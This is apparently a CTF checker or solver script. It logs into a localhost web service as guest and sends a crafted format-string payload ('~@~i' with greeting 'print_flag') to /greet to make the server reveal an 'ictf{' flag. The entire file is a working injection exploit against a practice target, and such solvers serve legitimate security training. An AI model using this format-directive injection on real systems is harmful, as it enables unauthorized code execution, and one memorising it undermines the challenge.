#!/usr/bin/env python3

import requests

try:
  s = requests.Session()
  r = s.get(f"http://localhost/").text
  r = s.post(f"http://localhost/login", data={"username": "guest", "password": "guest"}).text
  r = s.get(f"http://localhost/greet?format=~@~i&greeting=print_flag").text
  if "ictf{" in r:
    exit(0)
  else:
    exit(1)
except:
  exit(1)
